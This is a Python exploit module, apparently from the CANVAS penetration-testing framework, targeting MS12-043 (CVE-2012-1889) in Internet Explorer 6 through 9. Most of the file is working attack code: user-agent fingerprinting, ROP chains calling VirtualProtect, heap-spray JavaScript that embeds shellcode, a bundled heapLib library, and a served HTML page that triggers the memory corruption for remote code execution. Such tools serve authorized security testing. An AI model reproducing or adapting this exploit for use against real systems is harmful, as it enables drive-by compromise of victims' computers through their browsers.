
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from httpclientside import httpclientside

import sys
import struct
import base64
import random

import xorencoder
import canvasengine

from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME                              = 'MS12-043 Microsoft Internet Explorer XML Core Services Uninitialized Memory Corruption'
DESCRIPTION                       = 'MS12-043 Microsoft Internet Explorer XML Core Services Uninitialized Memory Corruption'

DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Microsoft"
DOCUMENTATION['Date public']      = '06/12/2012'
DOCUMENTATION['References']       = 'http://technet.microsoft.com/en-us/security/bulletin/ms12-043'
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = 'Internet Explorer 6/7/8/9'
DOCUMENTATION['CVE Name']         = 'CVE-2012-1889'
DOCUMENTATION['CVE Url']          = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-1889'
DOCUMENTATION['CVSS']             = 9.5

VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP','Vista','7']
PROPERTY['MSADV']                 = 'MS12-043'

DOCUMENTATION['Notes']            = """
This exploit takes advantage of an uninitialized variable vulnerability as exploited in the wild. 
When the get_definition function is called with no value, the CElement assumes the child obj is 
initialized which results in remote code execution.

Tested on:
* Windows XP Professional SP3 English with Internet Explorer 7
* Windows XP Professional SP3 English with Internet Explorer 8
* Windows Vista English with Internet Explorer 7
* Windows Vista English with Internet Explorer 8
* Windows 7 Ultimate English with Internet Explorer 8
* Windows 7 Ultimate English with Internet Explorer 9

Usage (important):
        If possible, try to avoid using the js_recon module with this exploit as loading 
        third party software may damage heap offsets.
"""

CHANGELOG                         = """
"""            

# command line usage:
# python ./exploits/clientd/clientd.py -l 10.1.1.3 -d 5555 -O server_port:8083 -O allowed_attack_modules:ms12_043 -O auto_detect_exploits:0
# ./commandlineInterface.py -v17 -p5555

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.filename           = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.shelllcode         = ""
        self.clsid              = "f6D90f11-9c73-11d3-b32e-00C04f990bb4"
        self.objectid           = "".join( [ random.choice(string.uppercase) for x in range(8) ] )
        self.universal          = True

    # returns the useragent type
    def is_vulnerable(self, clientdata):
        ua = clientdata['user_agent']
        if "MSIE 6.0" in ua:
            return 1
        elif "MSIE 6.1" in ua:
            return 1
        elif "MSIE 7.0" in ua:
            return 1
        elif "MSIE 8.0" in ua:
            return 1
        elif "MSIE 9.0" in ua:
            return 1
        else:
            self.log("Not IE 6/7/8/9 - possibly vulnerable, but not to this exploit")
            self.log("User Agent: %s" % ua)
            return 0

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()


    def run(self):
        self.log("Run this from clientd")
        return 0 

    def generate_rop(self, roptype):
        rop = ""
        if roptype == "jre":
            ropchain = [
                0x7c376541, # retn
                0x7c348b05, # xchg eax, esp; retn (pivot)
                0x7c347f98, # pop ebp; retn
                0x7c347f98, # pop ebp; retn
                0x7c347f98, # pop ebp; retn
                0x7c347f98, # pop ebp; retn
                0x7c37653d, # pop eax; pop edi; pop esi; pop ebx; pop ebp; retn
                0x00001000, # (dwSize)
                0x7c347f98, # retn (ROP NOP)
                0x7c3415a2, # jmp [eax]
                0xffffffff,
                0x7c376402, # skip 4 bytes
                0x7c345255, # inc ebx; fpatan; retn
                0x7c352174, # add ebx,eax; xor eax,eax; inc eax; retn
                0x7c344f87, # pop edx; retn
                0x00000040, # flNewProtect
                0x7c34d201, # pop ecx; retn
                0x7c38b001, # &Writable location
                0x7c347f97, # pop eax; retn
                0x7c37a151, # *VirtualProtect() - 0x0EF
                0x7c378c81, # pushad; add al,0x0ef; retn
                0x7c345c30, # push esp; retn
            ]
        elif roptype == "msvcrt":
            ropchain = [
                0x77c4ec00, # retn
                0x77c15ed5, # xchg eax, esp; ret (pivot)
                0x77c4ec01, # pop ebp; retn
                0x77c4ec01, # pop ebp; retn
                0x77c4ec01, # pop ebp; retn
                0x77c4ec01, # pop ebp; retn
                0x77c4e392, # pop eax; retn
                0x77c11120, # *VirtualProtect()
                0x77c2e493, # mov eax, [eax]; pop ebp; retn
                0x55762378, # junk
                0x77c2dd6c, # ?
                0x77c4ec00, # pop ebp; retn
                0x77c35459, # push esp; retn
                0x77c47705, # pop ebx; retn
                0x00001000, # ebx
                0x77c3ea01, # pop ecx; retn
                0x77c5d000, # W pointer (lpOldProtect) (-> ecx)
                0x77c46100, # pop edi; retn
                0x77c46101, # retn
                0x77c4d680, # pop edx; retn
                0x00000040, # newProtect (0x40) (-> edx)
                0x77c4e392, # pop eax; retn
                0x90909090, # nops (-> eax)
                0x77c12df9, # pushad; retn
            ]
        for dword in ropchain:
            rop += struct.pack('<L', dword)
        return rop
    
    def generate_spray(self, ua):
        nops         = urluencode("\x0c" * 4)
        oldskoolnops = urluencode("\x90\x90")
        sc           = urluencode(self.shellcode)
        # tested working
        if "MSIE 6.0" in ua or "MSIE 6.1" in ua or "MSIE 7.0" in ua:
            JS = """
            var heap_obj = new heapLib.ie(0x20000);
            var code = unescape("%s");
            var nops = unescape("%s");
            while (nops.length < 0x80000) nops += nops;
            var offset = nops.substring(0, 0x100);
            var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
            while (shellcode.length < 0x40000) shellcode += shellcode;
            var block = shellcode.substring(0, (0x80000-6)/2);
            heap_obj.gc();
            for (var z=1; z < 0x230; z++) {
                heap_obj.alloc(block);
            }
            """ % (sc, nops)
            JS = JS.replace("            ","")
            return JS
        
        elif "MSIE 8.0" in ua:
            # tested working
            if "NT 6.1" in ua or "NT 6.0" in ua:
                rop  = urluencode(struct.pack("<L", 0x7c347f98))
                rop += urluencode(self.generate_rop("jre"))
            # tested working
            elif "NT 5.1" in ua:
                rop  = urluencode(struct.pack("<L", 0x77c4ec01))
                rop += urluencode(self.generate_rop("msvcrt"))
            JS = """
            var heap_obj     = new heapLib.ie(0x20000);
            var code         = unescape("%s");
            var nops         = unescape("%s");
            var oldskoolnops = unescape("%s");
            var rop_chain = unescape("%s");
            while (nops.length < 0x80000) nops += nops;
            while (oldskoolnops.length < 0x80000) oldskoolnops += oldskoolnops;
            var nops_padding = nops.substring(0, 0x5f4-code.length);
            oldskoolnops = oldskoolnops.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);
            var shellcode = code + nops_padding + rop_chain + oldskoolnops;
            while (shellcode.length < 0x40000) shellcode += shellcode;
            var block = shellcode.substring(0, (0x80000-6)/2);
            heap_obj.gc();
            for (var z=1; z < 0x230; z++) {
                    heap_obj.alloc(block);
            }
            """ % (sc, nops, oldskoolnops, rop)
            JS = JS.replace("            ","")
            return JS
        # tested working
        elif "MSIE 9.0" in ua:
            nops = urluencode("\x90\x90\x90\x90")
            rop  = urluencode(struct.pack("<L", 0x0c0c0c0c))
            rop += urluencode(struct.pack("<L", 0x7c347f98))
            rop += urluencode(self.generate_rop("jre"))
            JS   = """
            function randomblock(blocksize){
                var theblock = "";
                for (var i = 0; i < blocksize; i++){
                    theblock += Math.floor(Math.random()*90)+10;
                }
                return theblock;
            }
            function tounescape(block){
                var blocklen = block.length;
                var unescapestr = "";
                for (var i = 0; i < blocklen-1; i=i+4){
                    unescapestr += "%%u" + block.substring(i,i+4);
                }
                return unescapestr;
            }
            var heap_obj = new heapLib.ie(0x10000);
            var rop = unescape("%s");
            var code = unescape("%s");
            var nops = unescape("%s");
            while (nops.length < 0x80000) nops += nops;
            var offset_length = 0x5fc;
            for (var i=0; i < 0x400; i++) {
                var padding = unescape(tounescape(randomblock(0x1000)));
                while (padding.length < 0x1000) padding+= padding;
                var junk_offset = padding.substring(0, offset_length - code.length);
                var single_sprayblock = code + junk_offset + rop + nops.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
                while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
                sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
                heap_obj.alloc(sprayblock);
            }
            """ % (rop, sc, nops)
            JS = JS.replace("            ","")
            return JS
    
    def generate_html(self, ua):
        spray = self.generate_spray(ua)
        html = """
        <html>
        <head>
        <script type="text/javascript">
        HEAPLIB
        %s
        </script>
        </head>
        <body>
        <object classid="clsid:%s" id="%s" ></object>
        <script type="text/javascript">
        var obj = document.getElementById("%s").object
        var src = unescape("%%u0c08%%u0c0c");
        while (src.length < 0x1002) src += src;
        src = "\\\\\\\\xxx" + src;
        src = src.substr(0, 0x1000 - 10);
        var pic = document.createElement("img");
        pic.src = src;
        pic.nameProp;
        obj.definition(0);
        </script>
        </body>
        </html>
        """ % (spray, self.clsid, self.objectid, self.objectid)
        html = html.replace("HEAPLIB",self.generate_heaplib())
        html = html.replace("        ","")
        return html
    
    # only the required functionality
    def generate_heaplib(self):
        heaplib_js = """
        //   JavaScript Heap Exploitation library
        //   by Alexander Sotirov <asotirov@determina.com>
        //  
        //   Version 0.3
        //
        // Copyright (c) 2007, Alexander Sotirov
        // All rights reserved.
        // 
        // The HeapLib library is licensed under a BSD license, the text of which follows:
        // 
        // Redistribution and use in source and binary forms, with or without
        // modification, are permitted provided that the following conditions
        // are met:
        // 
        // 1. Redistributions of source code must retain the above copyright
        //    notice, this list of conditions and the following disclaimer.
        // 2. Redistributions in binary form must reproduce the above copyright
        //    notice, this list of conditions and the following disclaimer in the
        //    documentation and/or other materials provided with the distribution.
        // 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
        //    may be used to endorse or promote products derived from this software
        //    without specific prior written permission.
        // 
        // THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
        // AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
        // IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
        // ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
        // LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
        // CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
        // SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
        // INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
        // CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
        // ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
        // POSSIBILITY OF SUCH DAMAGE.

        function heapLib() {
        }
        heapLib.ie = function(maxAlloc, heapBase) {
            this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
            this.heapBase = (heapBase ? heapBase : 0x150000);
            this.paddingStr = "AAAA";
            while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
                this.paddingStr += this.paddingStr;
            }
            this.mem = new Array();
            this.flushOleaut32();
        }
        heapLib.ie.prototype.debug = function(msg) {
            void(Math.atan2(0xbabe, msg));
        }
        heapLib.ie.prototype.padding = function(len) {
            if (len > this.paddingStr.length)
                throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";
            return this.paddingStr.substr(0, len);
        }
        heapLib.ie.prototype.allocOleaut32 = function(arg, tag){ 
            var size;
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
            if (this.mem[tag] === undefined)
                this.mem[tag] = new Array();
            if (typeof arg == "string" || arg instanceof String) {
                this.mem[tag].push(arg.substr(0, arg.length));
            }
            else {
                this.mem[tag].push(this.padding((arg-6)/2));
            }
        }
        heapLib.ie.prototype.freeOleaut32 = function(tag) {
            delete this.mem[tag];
            CollectGarbage();
        }
        heapLib.ie.prototype.flushOleaut32 = function() {
            this.debug("Flushing the OLEAUT32 cache");
            this.freeOleaut32("oleaut32");
            for (var i = 0; i < 6; i++) {
                this.allocOleaut32(32, "oleaut32");
                this.allocOleaut32(64, "oleaut32");
                this.allocOleaut32(256, "oleaut32");
                this.allocOleaut32(32768, "oleaut32");
            }
        }
        heapLib.ie.prototype.alloc = function(arg, tag) {
            var size;
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;
            else
                size = arg;
            if (size == 32 || size == 64 || size == 256 || size == 32768)
                throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
            this.allocOleaut32(arg, tag);
        }
        heapLib.ie.prototype.gc = function() {
            this.debug("Running the garbage collector");
            CollectGarbage();
            this.flushOleaut32();
        }
        """
        heaplib_js = heaplib_js.replace("        ","")        
        return heaplib_js
 
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        ua = clientheader.getHeaderValue('User-Agent')
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            if self.is_vulnerable(info_dict):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable.")
                return None, None
        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring = self.generate_html(ua)
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed. Not vulnerable?')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h,b
        else:
            self.log('redirecting to self test!')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    print "This needs to be run from clientd"
